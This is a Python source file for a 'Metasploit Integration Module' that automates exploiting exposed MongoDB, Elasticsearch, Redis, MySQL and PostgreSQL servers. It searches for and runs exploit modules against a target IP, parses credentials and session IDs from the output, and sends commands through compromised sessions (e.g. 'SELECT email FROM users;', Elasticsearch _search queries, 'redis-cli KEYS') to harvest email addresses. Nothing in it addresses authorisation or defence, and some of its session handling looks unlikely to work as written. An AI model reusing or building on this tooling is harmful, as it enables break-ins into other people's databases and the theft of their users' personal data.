"""
Metasploit Integration Module

Provides integration with Metasploit Framework for vulnerability scanning
and exploitation of exposed databases.
"""

import subprocess
import json
import re
import time
from typing import List, Dict, Any, Optional
from dataclasses import dataclass


@dataclass
class MetasploitModule:
    """Metasploit module information"""
    name: str
    path: str
    description: str
    rank: str
    references: List[str]


@dataclass
class ExploitResult:
    """Exploitation result"""
    target_ip: str
    target_port: int
    module_name: str
    success: bool
    output: str
    credentials: Optional[Dict[str, str]] = None
    session_id: Optional[int] = None
    extraction_time: float = 0.0


class MetasploitIntegration:
    """
    Integration with Metasploit Framework.
    
    Features:
    - Search for database exploits
    - Run vulnerability scans
    - Exploit vulnerable databases
    - Extract credentials from compromised systems
    - Manage Metasploit sessions
    """
    
    # Common database exploit modules
    DATABASE_EXPLOITS = {
        'mongodb': [
            'auxiliary/scanner/mongodb/mongodb_login',
            'auxiliary/scanner/mongodb/mongodb_enum',
            'exploit/linux/misc/mongodb_bind',
        ],
        'elasticsearch': [
            'auxiliary/scanner/elasticsearch/elasticsearch_enum',
            'exploit/linux/http/elasticsearch_script',
            'exploit/multi/elasticsearch/search_groovy',
        ],
        'redis': [
            'auxiliary/scanner/redis/redis_login',
            'auxiliary/scanner/redis/redis_server',
            'exploit/linux/redis/redis_replication',
        ],
        'mysql': [
            'auxiliary/scanner/mysql/mysql_login',
            'auxiliary/scanner/mysql/mysql_enum',
            'exploit/linux/mysql/mysql_udf_payload',
        ],
        'postgresql': [
            'auxiliary/scanner/postgres/postgres_login',
            'auxiliary/scanner/postgres/postgres_enum',
            'exploit/linux/postgres/postgres_payload',
        ],
    }
    
    def __init__(self, msf_path: str = 'msfconsole'):
        """
        Initialize Metasploit integration.
        
        Args:
            msf_path: Path to msfconsole executable
        """
        self.msf_path = msf_path
        self.sessions: Dict[int, Dict[str, Any]] = {}
    
    def check_metasploit_installed(self) -> bool:
        """
        Check if Metasploit is installed.
        
        Returns:
            True if Metasploit is installed
        """
        try:
            result = subprocess.run(
                [self.msf_path, '-v'],
                capture_output=True,
                text=True,
                timeout=10
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False
    
    def search_exploits(
        self,
        database_type: str,
        version: Optional[str] = None
    ) -> List[MetasploitModule]:
        """
        Search for exploits for a specific database type.
        
        Args:
            database_type: Database type (mongodb, elasticsearch, redis, etc.)
            version: Specific version to search for
            
        Returns:
            List of MetasploitModule objects
        """
        modules = []
        
        # Get known exploits for database type
        db_type_lower = database_type.lower()
        if db_type_lower in self.DATABASE_EXPLOITS:
            for module_path in self.DATABASE_EXPLOITS[db_type_lower]:
                modules.append(MetasploitModule(
                    name=module_path.split('/')[-1],
                    path=module_path,
                    description=f'{database_type} exploit module',
                    rank='normal',
                    references=[]
                ))
        
        # Search Metasploit for additional exploits
        try:
            search_cmd = f'search type:exploit name:{database_type}'
            result = self._run_msf_command(search_cmd)
            
            # Parse search results
            parsed_modules = self._parse_search_results(result)
            modules.extend(parsed_modules)
            
        except Exception as e:
            print(f"Error searching Metasploit: {e}")
        
        return modules
    
    def _parse_search_results(self, output: str) -> List[MetasploitModule]:
        """
        Parse Metasploit search results.
        
        Args:
            output: Metasploit search output
            
        Returns:
            List of MetasploitModule objects
        """
        modules = []
        
        lines = output.split('\n')
        for line in lines:
            # Parse module information from search results
            # Format: [rank] [type] [path] [description]
            match = re.search(r'(\w+)\s+(\w+)\s+(\S+)\s+(.*)', line)
            if match:
                rank, module_type, path, description = match.groups()
                
                if module_type == 'exploit':
                    modules.append(MetasploitModule(
                        name=path.split('/')[-1],
                        path=path,
                        description=description.strip(),
                        rank=rank.lower(),
                        references=[]
                    ))
        
        return modules
    
    def scan_vulnerabilities(
        self,
        target_ip: str,
        target_port: int,
        database_type: str
    ) -> List[Dict[str, Any]]:
        """
        Scan target for vulnerabilities.
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            database_type: Database type
            
        Returns:
            List of vulnerability dictionaries
        """
        vulnerabilities = []
        
        # Get exploits for database type
        exploits = self.search_exploits(database_type)
        
        for exploit in exploits:
            try:
                # Check if exploit is applicable
                vuln = self._check_exploit_applicability(
                    target_ip, target_port, exploit
                )
                
                if vuln:
                    vulnerabilities.append(vuln)
                    
            except Exception as e:
                print(f"Error checking exploit {exploit.name}: {e}")
                continue
        
        return vulnerabilities
    
    def _check_exploit_applicability(
        self,
        target_ip: str,
        target_port: int,
        exploit: MetasploitModule
    ) -> Optional[Dict[str, Any]]:
        """
        Check if exploit is applicable to target.
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            exploit: Metasploit module
            
        Returns:
            Vulnerability dictionary or None
        """
        try:
            # Run exploit check
            check_cmd = f'use {exploit.path}\nset RHOSTS {target_ip}\nset RPORT {target_port}\ncheck'
            result = self._run_msf_command(check_cmd)
            
            # Parse check result
            if 'vulnerable' in result.lower() or 'success' in result.lower():
                return {
                    'name': exploit.name,
                    'path': exploit.path,
                    'description': exploit.description,
                    'rank': exploit.rank,
                    'target_ip': target_ip,
                    'target_port': target_port,
                    'vulnerable': True,
                }
            
        except Exception as e:
            pass
        
        return None
    
    def exploit_database(
        self,
        target_ip: str,
        target_port: int,
        database_type: str,
        exploit_module: Optional[str] = None
    ) -> ExploitResult:
        """
        Exploit vulnerable database.
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            database_type: Database type
            exploit_module: Specific exploit module to use
            
        Returns:
            ExploitResult object
        """
        start_time = time.time()
        
        # Select exploit module
        if exploit_module is None:
            exploits = self.search_exploits(database_type)
            if not exploits:
                return ExploitResult(
                    target_ip=target_ip,
                    target_port=target_port,
                    module_name='none',
                    success=False,
                    output='No exploits found for database type',
                    extraction_time=time.time() - start_time
                )
            exploit_module = exploits[0].path
        
        try:
            # Run exploit
            exploit_cmd = f'use {exploit_module}\nset RHOSTS {target_ip}\nset RPORT {target_port}\nrun'
            result = self._run_msf_command(exploit_cmd)
            
            # Parse result
            success = 'session' in result.lower() or 'meterpreter' in result.lower()
            
            # Extract credentials if successful
            credentials = None
            session_id = None
            
            if success:
                credentials = self._extract_credentials(result)
                session_id = self._extract_session_id(result)
            
            return ExploitResult(
                target_ip=target_ip,
                target_port=target_port,
                module_name=exploit_module,
                success=success,
                output=result,
                credentials=credentials,
                session_id=session_id,
                extraction_time=time.time() - start_time
            )
            
        except Exception as e:
            return ExploitResult(
                target_ip=target_ip,
                target_port=target_port,
                module_name=exploit_module,
                success=False,
                output=f'Error running exploit: {e}',
                extraction_time=time.time() - start_time
            )
    
    def _extract_credentials(self, output: str) -> Optional[Dict[str, str]]:
        """
        Extract credentials from exploit output.
        
        Args:
            output: Exploit output
            
        Returns:
            Credentials dictionary or None
        """
        credentials = {}
        
        # Look for username/password patterns
        username_match = re.search(r'username[:\s]+([^\s,]+)', output, re.IGNORECASE)
        password_match = re.search(r'password[:\s]+([^\s,]+)', output, re.IGNORECASE)
        
        if username_match:
            credentials['username'] = username_match.group(1)
        if password_match:
            credentials['password'] = password_match.group(1)
        
        return credentials if credentials else None
    
    def _extract_session_id(self, output: str) -> Optional[int]:
        """
        Extract session ID from exploit output.
        
        Args:
            output: Exploit output
            
        Returns:
            Session ID or None
        """
        session_match = re.search(r'Session (\d+) created', output)
        if session_match:
            return int(session_match.group(1))
        
        return None
    
    def extract_emails_from_session(
        self,
        session_id: int,
        database_type: str
    ) -> List[str]:
        """
        Extract emails from compromised database session.
        
        Args:
            session_id: Metasploit session ID
            database_type: Database type
            
        Returns:
            List of email addresses
        """
        emails = []
        
        try:
            # Send commands to session to extract emails
            if database_type.lower() == 'mongodb':
                emails = self._extract_mongodb_emails(session_id)
            elif database_type.lower() == 'elasticsearch':
                emails = self._extract_elasticsearch_emails(session_id)
            elif database_type.lower() == 'redis':
                emails = self._extract_redis_emails(session_id)
            elif database_type.lower() == 'mysql':
                emails = self._extract_mysql_emails(session_id)
            elif database_type.lower() == 'postgresql':
                emails = self._extract_postgresql_emails(session_id)
                
        except Exception as e:
            print(f"Error extracting emails from session: {e}")
        
        return emails
    
    def _extract_mongodb_emails(self, session_id: int) -> List[str]:
        """
        Extract emails from MongoDB session.
        
        Args:
            session_id: Session ID
            
        Returns:
            List of email addresses
        """
        emails = []
        
        # Send MongoDB commands to extract emails
        commands = [
            'use admin',
            'db.runCommand({listDatabases: 1})',
            'show dbs',
        ]
        
        for cmd in commands:
            result = self._send_session_command(session_id, cmd)
            
            # Extract emails from output
            email_matches = re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                result
            )
            emails.extend(email_matches)
        
        return list(set(emails))
    
    def _extract_elasticsearch_emails(self, session_id: int) -> List[str]:
        """
        Extract emails from Elasticsearch session.
        
        Args:
            session_id: Session ID
            
        Returns:
            List of email addresses
        """
        emails = []
        
        # Send Elasticsearch commands to extract emails
        commands = [
            'curl -X GET "localhost:9200/_cat/indices?v"',
            'curl -X GET "localhost:9200/_search?size=1000"',
        ]
        
        for cmd in commands:
            result = self._send_session_command(session_id, cmd)
            
            # Extract emails from output
            email_matches = re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                result
            )
            emails.extend(email_matches)
        
        return list(set(emails))
    
    def _extract_redis_emails(self, session_id: int) -> List[str]:
        """
        Extract emails from Redis session.
        
        Args:
            session_id: Session ID
            
        Returns:
            List of email addresses
        """
        emails = []
        
        # Send Redis commands to extract emails
        commands = [
            'redis-cli KEYS "*"',
            'redis-cli GET *',
        ]
        
        for cmd in commands:
            result = self._send_session_command(session_id, cmd)
            
            # Extract emails from output
            email_matches = re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                result
            )
            emails.extend(email_matches)
        
        return list(set(emails))
    
    def _extract_mysql_emails(self, session_id: int) -> List[str]:
        """
        Extract emails from MySQL session.
        
        Args:
            session_id: Session ID
            
        Returns:
            List of email addresses
        """
        emails = []
        
        # Send MySQL commands to extract emails
        commands = [
            'mysql -e "SHOW DATABASES;"',
            'mysql -e "SELECT email FROM users;"',
        ]
        
        for cmd in commands:
            result = self._send_session_command(session_id, cmd)
            
            # Extract emails from output
            email_matches = re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                result
            )
            emails.extend(email_matches)
        
        return list(set(emails))
    
    def _extract_postgresql_emails(self, session_id: int) -> List[str]:
        """
        Extract emails from PostgreSQL session.
        
        Args:
            session_id: Session ID
            
        Returns:
            List of email addresses
        """
        emails = []
        
        # Send PostgreSQL commands to extract emails
        commands = [
            'psql -c "\\l"',
            'psql -c "SELECT email FROM users;"',
        ]
        
        for cmd in commands:
            result = self._send_session_command(session_id, cmd)
            
            # Extract emails from output
            email_matches = re.findall(
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                result
            )
            emails.extend(email_matches)
        
        return list(set(emails))
    
    def _send_session_command(
        self,
        session_id: int,
        command: str
    ) -> str:
        """
        Send command to Metasploit session.
        
        Args:
            session_id: Session ID
            command: Command to send
            
        Returns:
            Command output
        """
        try:
            # Send command to session
            session_cmd = f'sessions -i {session_id}\n{command}\nexit'
            result = self._run_msf_command(session_cmd)
            
            return result
            
        except Exception as e:
            return ''
    
    def _run_msf_command(self, command: str) -> str:
        """
        Run Metasploit command.
        
        Args:
            command: Command to run
            
        Returns:
            Command output
        """
        try:
            # Create resource script
            resource_script = f'{command}\nexit\n'
            
            # Run msfconsole with resource script
            result = subprocess.run(
                [self.msf_path, '-r', '-'],
                input=resource_script,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return result.stdout + result.stderr
            
        except subprocess.TimeoutExpired:
            return 'Command timed out'
        except Exception as e:
            return f'Error: {e}'
    
    def list_sessions(self) -> List[Dict[str, Any]]:
        """
        List active Metasploit sessions.
        
        Returns:
            List of session dictionaries
        """
        try:
            result = self._run_msf_command('sessions -l')
            
            # Parse session list
            sessions = []
            lines = result.split('\n')
            
            for line in lines:
                # Parse session information
                match = re.search(r'(\d+)\s+(\w+)\s+(\S+)\s+(\S+)', line)
                if match:
                    session_id, session_type, tunnel, via = match.groups()
                    sessions.append({
                        'id': int(session_id),
                        'type': session_type,
                        'tunnel': tunnel,
                        'via': via,
                    })
            
            return sessions
            
        except Exception as e:
            print(f"Error listing sessions: {e}")
            return []
